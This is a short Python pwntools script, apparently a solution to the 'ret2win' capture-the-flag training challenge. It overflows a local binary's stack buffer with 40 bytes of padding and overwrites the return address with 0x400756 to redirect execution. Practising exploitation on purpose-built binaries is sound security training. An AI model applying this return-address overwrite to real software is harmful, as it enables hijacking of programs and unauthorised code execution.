from pwn import *

p = process("./ret2win")

junk = 40*b"A"
payload = junk
payload += p64(0x400756)

p.sendline(payload)
p.interactive()
